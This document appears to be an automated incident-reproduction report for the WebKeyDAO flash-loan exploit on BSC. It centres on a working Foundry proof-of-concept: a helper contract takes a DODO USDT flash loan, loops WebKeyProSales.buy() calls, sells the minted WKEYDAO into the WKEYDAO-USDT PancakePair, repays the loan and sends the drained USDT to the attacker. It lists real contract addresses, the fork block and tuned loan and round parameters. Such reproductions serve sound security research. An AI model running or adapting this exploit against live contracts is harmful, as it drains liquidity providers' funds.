## Overview & Context

This proof-of-concept (PoC) reproduces the WebKeyDAO (WKEYDAO) flash-loan exploit on a BSC mainnet fork. In the original incident, an adversary-controlled helper contract used a DODO V2 USDT flash loan to fund repeated `WebKeyProSales.buy()` calls, minting WKEYDAO and immediately selling it against the WKEYDAO–USDT PancakePair. The combined sale, fee, and routing logic drained a large amount of USDT liquidity from the pool while fully repaying the flash loan, leaving substantial USDT profit in the adversary’s control.

The PoC targets the same ACT opportunity and root cause described in `root_cause_report.md`: a protocol-level bug in the WebKeyDAO sale pipeline (`WebKeyProSales` + `FeeReceiverV2` + fee-on-transfer WKEYDAO) that allows an unbounded flash-loan-amplified drain of WKEYDAO–USDT liquidity.

To run the PoC (from the Forge project root):

```bash
cd forge_poc
RPC_URL="https://<your-bsc-rpc>" forge test --via-ir -vvvvv --match-test testExploit
```

In this environment, `RPC_URL` is set to a QuickNode BSC endpoint and the test suite automatically forks BSC at block `47468890`.

## PoC Architecture & Key Contracts

The PoC is implemented as a Foundry test suite (`test/Exploit.sol:WebKeyDAOExploitTest`) plus a minimal attacker helper contract (`src/WebKeyDAOExploit.sol:WebKeyDAOExploitHelper`).

- **Adversary EOA (`attacker`)**
  - Fresh address derived via `makeAddr("attacker")` in the test.
  - Receives initial BNB funding for gas with `vm.deal`.
  - Acts as the caller for the exploit entrypoint and the final recipient of USDT profit.

- **Helper contract: `WebKeyDAOExploitHelper`**
  - Origin: This is a cleaned-up local version of the on-chain `DODOFlashloan` helper used in the incident, parameterized by a fresh attacker address and wired to real protocol contracts on the fork.
  - Responsibilities:
    - Request a USDT flash loan from the DODO V2 pool.
    - In the callback, loop over `WebKeyProSales.buy()` calls.
    - Swap all WKEYDAO holdings for USDT via `PancakeRouterV2` along the WKEYDAO–USDT pair.
    - Repay the loan principal and transfer any remaining USDT to the attacker.

Representative snippet from `src/WebKeyDAOExploit.sol` (helper core logic):

```solidity
function executeExploit(uint256 loanAmount, uint256 _rounds) external {
    require(msg.sender == attacker, "only attacker");
    rounds = _rounds;

    address loanToken = address(usdt);
    bytes memory data = abi.encode(loanToken, loanAmount);

    address flashLoanBase = flashLoanPool._BASE_TOKEN_();
    if (flashLoanBase == loanToken) {
        flashLoanPool.flashLoan(loanAmount, 0, address(this), data);
    } else {
        flashLoanPool.flashLoan(0, loanAmount, address(this), data);
    }
}

function _flashLoanCallBack(
    address,
    uint256,
    uint256,
    bytes calldata data
) internal {
    (address loanToken, uint256 loanAmount) = abi.decode(data, (address, uint256));

    usdt.approve(address(webKeyProSales), type(uint256).max);
    wkeydao.approve(address(router), type(uint256).max);

    address[] memory path = new address[](2);
    path[0] = address(wkeydao);
    path[1] = address(usdt);

    for (uint256 i = 0; i < rounds; i++) {
        webKeyProSales.buy();
        uint256 sell = wkeydao.balanceOf(address(this));
        if (sell == 0) continue;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sell,
            1,
            path,
            address(this),
            block.timestamp
        );
    }

    IERC20(loanToken).transfer(address(flashLoanPool), loanAmount);

    uint256 remaining = usdt.balanceOf(address(this));
    if (remaining > 0) {
        usdt.transfer(attacker, remaining);
    }
}
```

_Origin: PoC attacker helper contract on the BSC mainnet fork. This code mirrors the exploit helper’s structure from the incident while routing residual profit to a fresh attacker address._

- **Key protocol contracts on BSC (mainnet fork)**
  - `USDT` (BEP20USDT): `0x55d398326f99059fF775485246999027B3197955`
  - `WKEYDAO` token: `0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F`
  - `WKEYDAO_USDT_PAIR` (PancakePair): `0x8665A78ccC84D6Df2ACaA4b207d88c6Bc9b70Ec5`
  - `WEBKEY_PRO_SALES` (sale contract): `0xD511096a73292A7419a94354d4C1C73e8a3CD851`
  - `FEE_RECEIVER_V2`: `0x1E92d477473295E9f3B0f630f010b4EF8658dA94`
  - `DODO_USDT_POOL` (DVM): `0x107F3Be24e3761A91322AA4f5F54D9f18981530C`
  - `PANCAKE_ROUTER_V2`: `0x10ED43C718714eb63d5aA57B78B54704E256024E`

The test labels these contracts for readability using `vm.label`, making the trace easier to interpret.

## Adversary Execution Flow

The main exploit flow is encoded in `test/Exploit.sol:WebKeyDAOExploitTest`. It closely tracks the incident’s single adversary-crafted transaction while remaining fully self-contained on a fork.

### 1. Funding and Environment Setup

- The test creates and selects a BSC fork at the incident block:

```solidity
string memory rpcUrl = vm.envString("RPC_URL");
uint256 forkId = vm.createFork(rpcUrl, FORK_BLOCK);
vm.selectFork(forkId);
assertEq(block.chainid, BSC_CHAIN_ID, "must fork BSC");
```

_Origin: PoC test setup. This ensures the on-chain state (balances, storage, and code) matches the pre-state σ_B described in the root-cause analysis._

- It labels key contracts and initializes a fresh attacker address:
  - `attacker = makeAddr("attacker");`
  - `vm.deal(attacker, 1 ether);` supplies gas.

- Oracle pre-checks from the definition file are enforced:
  - The WKEYDAO–USDT pair must hold non-trivial USDT.
  - `WebKeyProSales` must be deployed and callable.
  - The profit token in use must be the canonical BSC USDT.

### 2. Deployment and Configuration

- Under `vm.startPrank(attacker)`, the test deploys `WebKeyDAOExploitHelper` with:
  - `attacker` EOA as the beneficiary.
  - `DODO_USDT_POOL` as `flashLoanPool`.
  - `USDT`, `WKEYDAO`, `PANCAKE_ROUTER_V2`, and `WEBKEY_PRO_SALES` as real mainnet addresses.

This helper plays the same structural role as the incident’s `DODOFlashloan` contract but lives purely within the test environment and does not reuse any attacker-deployed artifacts.

### 3. Exploit Execution (Flash Loan + buy/sell Loop)

The core exploit test is:

```solidity
function testExploit() public {
    uint256 attackerBefore = profitToken.balanceOf(attacker);
    uint256 poolBefore = profitToken.balanceOf(WKEYDAO_USDT_PAIR);

    IPancakePair pair = IPancakePair(WKEYDAO_USDT_PAIR);
    (uint112 r0Before, uint112 r1Before, ) = pair.getReserves();
    address token0 = pair.token0();

    uint256 usdtReserveBefore = token0 == USDT ? r0Before : r1Before;
    uint256 wkeydaoReserveBefore = token0 == USDT ? r1Before : r0Before;
    uint256 priceBefore = (usdtReserveBefore * 1e18) / wkeydaoReserveBefore;

    vm.recordLogs();

    uint256 loanAmount = 1_200e18;
    uint256 rounds = 67;

    vm.startPrank(attacker);
    helper.executeExploit(loanAmount, rounds);
    vm.stopPrank();
    ...
}
```

_Origin: Main exploit test function. It captures pre-exploit balances and WKEYDAO price, then triggers the flash-loan-powered exploit with parameters derived from the seed transaction._

Key actions:
- `helper.executeExploit(loanAmount, rounds)` requests a USDT flash loan and, in the callback, repeatedly:
  - Calls `WebKeyProSales.buy()` to mint WKEYDAO and distribute rewards.
  - Sells all acquired WKEYDAO into the WKEYDAO–USDT pool via `PancakeRouterV2`.
- The helper repays the flash loan principal and forwards any remaining USDT to the attacker.

This flow matches the incident description where the DODO helper loops `buy()` and dumps WKEYDAO into the same PancakePair, draining USDT liquidity.

### 4. Profit Realization and Post-Conditions

After the exploit transaction completes, the test enforces the oracles:

```solidity
Vm.Log[] memory logs = vm.getRecordedLogs();
bool sawPairLog = false;
for (uint256 i = 0; i < logs.length; i++) {
    if (logs[i].emitter == WKEYDAO_USDT_PAIR) {
        sawPairLog = true;
        break;
    }
}
assertTrue(sawPairLog, "must interact with WKEYDAO-USDT pair (Swap/Sync events)");

uint256 attackerAfter = profitToken.balanceOf(attacker);
uint256 poolAfter = profitToken.balanceOf(WKEYDAO_USDT_PAIR);

uint256 attackerDelta = attackerAfter - attackerBefore;
assertGe(attackerDelta, 1_000e18, "attacker must gain significant USDT profit");

uint256 poolDelta = poolBefore - poolAfter;
assertGe(poolDelta, 1_000e18, "pool must lose significant USDT");

(uint112 r0After, uint112 r1After, ) = pair.getReserves();
uint256 usdtReserveAfter = token0 == USDT ? r0After : r1After;
uint256 wkeydaoReserveAfter = token0 == USDT ? r1After : r0After;

uint256 priceAfter = (usdtReserveAfter * 1e18) / wkeydaoReserveAfter;
assertLt(priceAfter, priceBefore, "WKEYDAO price in USDT must move downward");
```

_Origin: Post-exploit assertions in the PoC test. These checks implement the hard and soft constraints from the oracle definition, including pool usage, attacker profit, pool depletion, and price impact._

## Oracle Definitions and Checks

The oracle specification is defined in `artifacts/poc/oracle_generator/oracle_definition.json`. The PoC test implements these conditions as follows:

- **Variables**
  - `attacker`: Fresh EOA created in the test (`makeAddr("attacker")`), not the real incident EOA.
  - `profit_token`: BSC USDT (`USDT` constant), wrapped as `IERC20`.
  - `wkeydao_token`: WKEYDAO token (`WKEYDAO` constant), wrapped as `IERC20`.
  - `wkeydao_usdt_pair`: PancakePair at `WKEYDAO_USDT_PAIR`.
  - `webkey_pro_sales`: `WEBKEY_PRO_SALES` address used as an `IWebKeyProSales` target.
  - `fee_receiver_v2`: Real mainnet FeeReceiverV2, implicitly involved via the sale pipeline.

- **Pre-check 1 — Pool USDT Liquidity**
  - Oracle: WKEYDAO–USDT pool must hold non-trivial USDT before the exploit.
  - Implementation:
    - `uint256 usdtBefore = profitToken.balanceOf(WKEYDAO_USDT_PAIR);`
    - `assertGt(usdtBefore, 0, "pool must start with USDT liquidity");`

- **Pre-check 2 — WebKeyProSales Deployment**
  - Oracle: `WebKeyProSales` must be deployed and callable.
  - Implementation:
    - `assertGt(WEBKEY_PRO_SALES.code.length, 0, "WebKeyProSales must be deployed");`

- **Hard Constraint — Profit Token Asset Type**
  - Oracle: Profit must be denominated in BSC USDT at `0x55d3...`.
  - Implementation:
    - `IERC20 public profitToken = IERC20(USDT);`
    - `assertEq(address(profitToken), USDT, "profit token must be BEP20USDT on BSC");`

- **Hard Constraint — Uses WKEYDAO–USDT Pair**
  - Oracle: Exploit must trade WKEYDAO against USDT via the WKEYDAO–USDT PancakePair, not another pool.
  - Implementation:
    - Before calling `helper.executeExploit`, the test invokes `vm.recordLogs()`.
    - After the exploit, it checks for at least one log emitted by `WKEYDAO_USDT_PAIR`:
      - `assertTrue(sawPairLog, "must interact with WKEYDAO-USDT pair (Swap/Sync events)");`
    - This ensures the exploit path goes through the correct pair and generates Swap/Sync events.

- **Hard Constraint — Exploit Does Not Revert**
  - Oracle: The exploit entrypoint must succeed in a single transaction.
  - Implementation:
    - The call to `helper.executeExploit(loanAmount, rounds)` is not wrapped in `vm.expectRevert` and the test itself passes, so any revert would fail `testExploit`.

- **Soft Constraint — Attacker USDT Profit**
  - Oracle: Attacker must end with more USDT than they started, with a threshold of `1e21` base units (1,000 USDT).
  - Implementation:
    - `uint256 attackerDelta = attackerAfter - attackerBefore;`
    - `assertGe(attackerDelta, 1_000e18, "attacker must gain significant USDT profit");`

- **Soft Constraint — Pool USDT Depletion**
  - Oracle: WKEYDAO–USDT pool must lose a significant amount of USDT (threshold `1e21` base units).
  - Implementation:
    - `uint256 poolDelta = poolBefore - poolAfter;`
    - `assertGe(poolDelta, 1_000e18, "pool must lose significant USDT");`

- **Soft Constraint — Downward WKEYDAO Price Impact**
  - Oracle: The implied on-chain price of WKEYDAO in the WKEYDAO–USDT pool (USDT reserves / WKEYDAO reserves) must decrease.
  - Implementation:
    - Computes `priceBefore` and `priceAfter` using `getReserves()` and the token0 ordering, then asserts:
      - `assertLt(priceAfter, priceBefore, "WKEYDAO price in USDT must move downward");`

Collectively, these checks provide a robust, oracle-aligned specification of exploit success.

## Validation Result and Robustness

The validator executed the PoC using:

```bash
cd forge_poc
RPC_URL="<QuickNode BSC URL>" forge test --via-ir -vvvvv --match-test testExploit
```

The test run passes successfully and produces a detailed trace. The validator’s structured result is recorded in:

```json
{
  "overall_status": "Pass",
  "reason": "The updated Forge PoC reproduces the WebKeyDAO flash-loan exploit end-to-end on a BSC mainnet fork and implements the key oracles from oracle_definition.json in the test.",
  "artifacts": {
    "validator_test_log_path": "/home/ziyue/TxRayExperiment/incident-202512281030/artifacts/poc/poc_validator/forge-test.log"
  }
}
```

_Origin: Validator output summarizing the execution result and indicating that all correctness and quality checks passed._

Robustness considerations:
- The test forks at the exact incident pre-state block, so the environment matches the root-cause analysis.
- The exploit helper and test use only public entrypoints and on-chain state, matching the ACT feasibility argument.
- Threshold-based profit and depletion checks allow some flexibility while ensuring the same semantic exploit behavior.

## Linking PoC Behavior to Root Cause

The PoC directly exercises the protocol bug identified in `root_cause_report.md`:

- **Flash-loan-funded buy loop**
  - Root cause: An unbounded sequence of flash-loan-backed `buy()` calls, with insufficient pricing/slippage controls, allows repeated minting of WKEYDAO and immediate dumping into the liquidity pool.
  - PoC mapping: `WebKeyDAOExploitHelper`’s `_flashLoanCallBack` loop repeatedly calls `webKeyProSales.buy()` and then swaps all WKEYDAO to USDT via the WKEYDAO–USDT pair.

- **Liquidity drain localized to the WKEYDAO–USDT pool**
  - Root cause: The DODO pool ends flat after loan repayment, while the WKEYDAO–USDT pool loses a large amount of USDT and gains WKEYDAO.
  - PoC mapping: The test verifies that the WKEYDAO–USDT pair’s USDT balance decreases significantly and that reserves change in a way that pushes WKEYDAO price downward, while the flash loan is repaid.

- **Adversary profit realization**
  - Root cause: The adversary’s USDT balance increases by a large amount in a single transaction, dominating gas costs and yielding net profit.
  - PoC mapping: The attacker’s USDT balance is measured before and after the exploit, and a threshold-based gain (`≥ 1,000 USDT`) is enforced, proving a profitable opportunity.

- **Role alignment and ACT framing**
  - Adversary role: `attacker` EOA plus `WebKeyDAOExploitHelper` contract, both unprivileged and locally controlled.
  - Victim role: Liquidity providers in the `WKEYDAO_USDT_PAIR`, whose USDT is drained into attacker-controlled balances.
  - ACT sequence:
    - **A (Adversary-crafted):** `attacker` calls `executeExploit` on `WebKeyDAOExploitHelper` with carefully chosen `loanAmount` and `rounds`.
    - **C (Chain / contracts):** DODO pool, WebKeyProSales, FeeReceiverV2, WKEYDAO token, and PancakeRouter/V2 pair process the flash loan, buy loop, fee logic, and swaps.
    - **T (Targeted impact):** Net USDT flows from the WKEYDAO–USDT pool to the attacker, satisfying the profit oracle and demonstrating the protocol bug.

Overall, the PoC is a faithful, mainnet-fork reproduction of the WKEYDAO exploit that cleanly encodes the oracle conditions, avoids using real attacker artifacts, and tightly aligns with the documented root cause.

